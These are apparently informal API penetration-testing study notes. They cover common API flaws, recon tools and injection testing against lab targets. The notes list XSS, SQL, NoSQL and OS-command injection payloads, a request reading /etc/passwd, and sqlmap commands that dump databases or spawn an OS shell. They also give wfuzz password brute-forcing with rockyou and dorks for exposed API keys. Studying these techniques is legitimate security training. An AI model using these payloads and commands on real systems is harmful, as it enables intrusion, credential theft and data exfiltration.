
## Some Previllant Sec Bugs in API

### Inforamtion Discolosures
[
- Request : GET https://www.sitename.org/wp-json/wp/v2/users

- Response : [{"id":1,"name":"Administrator", "slug":"admin"}],
             {"id":2,"name":"Vincent Valentine", "slug":"Vincent"}]

  [Self Explainatory and we could change the reqiest methods to see if something can be updated using different API methods
  this includes POST,GET,OPTIONS,DELETE,PUT]

### Broken Object Level Authorization
[
- Requests : https://bestgame.com/api/v3/users?id=5501
  [Rembember the last id thats whats fetching the data of other users, we could fetch the user data of 5502 and exploit it]
]
### Broken User Authentication
[
    [This referes to any weakness within API aithentication Process
    Essentially checking for Auth key or i say API_key]

- Requests :
]

### Excessive Data Exposure
[
- Requests : GET /api/v3/account?name=Cloud+Strife
- Response : {
  "id": "5501",
  "first_name": "Cloud",
  "last_name": "Strife",
  "privilege": "user",
  "representative":

[
"name": "Don Corneo",
"id": "2203"
"email": "dcorn@gmail.com",
"privilege": "super-admin"
"admin": true
"two_factor_auth": false,
}
]
[Basically throwing information more than needed in the above we see it is also throwing who created the id as well this is wild]

### Lack of Resources and Rate Limiting

[
    Basicallly no limit on excessive requests potentially allowing for bruteforce
we can downgrade the api version by changing the "v3" to "v1" which could potentially allow us for no rate limiting.

]

### Broken Function Level Authorization

[Basically its the ability to access the functionality of other privillages or i say account types depending upon the vulnerabilities its BOLA with a POST requests in a general simple terms, some of the Functions are limited to the administrative function but by swapping the function we could use these functions bit vague
/{user}/account/balance
/admin/account/{user}

]

### Mass Assignment

[when api includes more parameter than intended basically allowing for more resource fetching ]
[
- Requests : POST https://bestgame.com/api/v3/users

            {
                "User": "scuttleph1sh",
                "Password": "GreatPassword123"
            }

  [We could tamper these and send a new key such as "isadmin" potentially allowing for mass assignment]
  {
  User": "scuttleph1sh",
  "Password": "GreatPassword123",
  "isAdmin": true
  }
]
### Security Misconfiguration

    [WE could start by checking headers
        X-powered-By: VulnService 1.11
        X-XSS-Protection: 0
        X-Response-Time: 566

    Just by looking we could identify the real account by checking for potential user in the server by checking the server time.
    We have Xss as well we could see it is not sanititzed so potentially new vulnerability
    ]

### Injections
[
- Requests: POST /api/v1/register HTTP 1.1
  Host : blabla.com

            {
                "Name": "Ryan",
                "Address": " "' OR 1=0--",

            }

- More Requests GET http://ip_addr:port/api/v1/resources/books?show=/etc/passwd
]
  [
  Crafting proper Injection Flaws requires delligient time and effort to craft and see the response of the server
  ]

## Passive Recon
- Google dorking : 
### Google hacking
- inurl:"/wp-json/wp/v2/users"Finds all publicly available
  WordPress API user directories.
- intitle:"index.of" intext:"api.txt"Finds publicly available API key files.
- inurl:"/includes/api/" intext:"index of /"Finds potentially interesting API directories.
- ext:php inurl:"api.php?action="Finds all sites with a XenAPI SQL injection vulnerability. (This query was posted in 2016; four years later, there were 141,000 results.)
- intitle:"index of" api_key OR "api key" OR apiKey -poolLists potentially exposed API keys.
(This is one of my favorite queries.)

### Finding hidden path in Robots.txt

User-agent: *
Disallow: /appliance/
Disallow: /login/
Disallow: /api/
Disallow: /files/

### OWASP Amass
amass enum -passive -d twitter.com | grep api

### Searching for API keys in DevTools

## Active Recon

### Baseline Scanning with Nmap

nmap -sC -sV <target_ip or range> -oA nameofoutput 

### Crawling URLs with Owasp ZAP and manual explore

### FFUF -u <target_url> -d /wordlist/location/common_apis_160.txt

### kiterunner
  - its an cli linux program that will discover api content and its preety cool updated APIs routes files and replay thats awesome a full fledge api hacking tool

#### Vuln scanning 
  - we will brute a api routes list just as ffuf but for APIS
  kr brute <target> -w ~/api/wordlists/data/automated/nameofwordlist.txt
#### upon finding intresting endpoint we will replay
  - we can replay intresting api request using kr 
  we just copied entirely the thing inside "" is copy and pasted and 
  - kr kb replay "GET 414 [183,7,8] http://192.168.50.35:8888/api/privatisations/count 0cf6841b1e7ac8badc6e237ab300a90ca873d571" -w ~/api/wordlists/data/kiterunner/routes-
large.

and this one is for authenticated scan well get it from login from broswer and proxy through burp or from endpoint themselves 
  - kr scan http://192.168.50.35:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite -H
'x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7Il9pZCI6NDUsImVtYWlsIjoiaGF
waUBoYWNrZXIuY29tIiwicGFzc3dvcmQiOiJQYXNzd29yZDEhIiwibmFtZSI6Im15c2VsZmNyeSIsInBpYyI6Imh0dHBzO
i8vczMuYW1hem9uYXdzLmNvbS91aWZhY2VzL2ZhY2VzL3R3aXR0ZXIvZ2FicmllbHJvc3Nlci8xMjguanBnIiwiaXNfYWRt
aW4iOmZhbHNlLCJhY2NvdW50X2JhbGFuY2UiOjUwLCJhbGxfcGljdHVyZXMiOltdfSwiaWF0IjoxNjMxNDE2OTYwfQ._qoC
_kgv6qlbPLFuH07-DXRUm9wHgBn_GD7QWYwvzFk'
 
 or we can just proxy it to burp like this 
kr kb replay -w ~/api/wordlists/data/kiterunner/routes-large.kite --proxy=http://127.0.0.1:8080 "GET 403 [ 48,3,1] http://192.168.50.35:8090/api/
picture/detail.php 0cf6889d2fba4be08930547f145649ffead29edb"

We can povot to brupsuit from here
### Tools
#### WFUZZ
  - Its a program that will automate bruteforce in the url parameter and perform requested request to the server.

  command : wfuzz -z file,/usr/share/wordlist-api.txt https://targetname.com/FUZZ 

            wfuzz -X POST -z list,admin-dasboard-api http://targetname.com/FUZZ

  - this is bruteforcing using json and as payload we will use rockyou.txt and headers as Content-Type: application/json while ignoring 405 responses
            wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 -H 'Content-Type: application/json' -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth


--sc  Only shows responses with specific HTTP response codes
--sl  Only shows responses with a certain number of lines
--sw  Only shows responses with a certain number of words
--sh  Only shows responses with a certain number of characters
--hc  Hides responses with specific HTTP status codes
--hl  Hides responses with a specified number of lines
--hw  Hides responses with a specified number of words
--hh  Hides responses with specified number of characters


VAmPIErev0s https://github.com/erev0s/VAmPI
DVWS-nodeSnoopysecurity https://github.com/snoopysecurity/dvws-node
DamnVulnerable
MicroServicesne0z https://github.com/ne0z/
DamnVulnerableMicroServices
Node-API-goatLayro01  https://github.com/layro01/node-api-goat
Vulnerable
GraphQL APIAidanNoll  https://github.com/CarveSystems/vulnerable
-graphql-api
Generic-University InsiderPhD https://github.com/InsiderPhD/Generic-University
vulnapi https://github.com/tkisason/vulnapi
tkisason



## Authorization Exploitation
  - x

## Mass Assignments
  - we will need to see response and check for intresting variables such as "isAdmin":"True" , "Privillage":"Admin","mfa": true, or anything that is intreguing also notetaking is must to exploit mass assignemnts as we know that we need to acquire the variable name to use it in requests.

## Injection 
### XSS 
  - we can check this where api asks for client input and displays in a web some functionality should allow us that!!!!
  - we can change the "Content-Type: text/html" to make sure server knows that we want the request in htmk or text format.
  - <script>alert("xss")</script>
    <script>alert(1);</script>
    <%00script>alert(1)</%00script>
    SCRIPT>alert("XSS");///SCRIPT>
  - requests : 
    POST /api/profile/update HTTP/1.1
    Host: hapihackingblog.com
    Authorization: hAPI.hacker.token
    Content-Type: application/json
      {
        "fname": "hAPI",
        "lname": "Hacker",
        "city": "<script>alert("xas")</script>"
      }
### SQLi
  - Here are some SQL metacharacters that can cause some issues:
'             
''
;%00
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1

  - Basically want to make server error and get verbose data on the required parameter or application information such as which version and service is running.

  - Using SQLmap we could use intresting burp request (we can save those in burp ) to throw it into the sqlmap and scan it
    
    sqlmap -r /home/hapihacker/burprequest1 -p password
      (the p is parameter we can test)
    sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all
      (this will dump all the database from the server)
    sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell
      (spanning SHell)
    sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-pwn

### NoSQL Injection pageno
  - its like database that doesnot use sql basically or any structured language its 

  $gt         || '1'=='1
{"$gt":""}    //
{"$gt":-1}    ||'a'\\'a
$ne           '||'1'=='1';//
{"$ne":""}    '/{}:
{"$ne":-1}    '"\;{}
$nin          '"\/$[].>
{"$nin":1}    {"$where":"sleep(1000)"}
{"$nin":[1]}

### OS Injection
  - Basically using os command using pipes, ands , command , and more
  if windows use "ipconfig" adnd linux as "ifconfig"
  |   '
  ||  "
  &   ;
  &&  '"


  wfuzz -z file,wordlists/commandsep.txt -z file,wordlists/os-cmds.txt http://vulnerableAPI.com/api/users/query?=WFUZZWFUZ2Z


- in above command first one is seperator and second one is command to execute
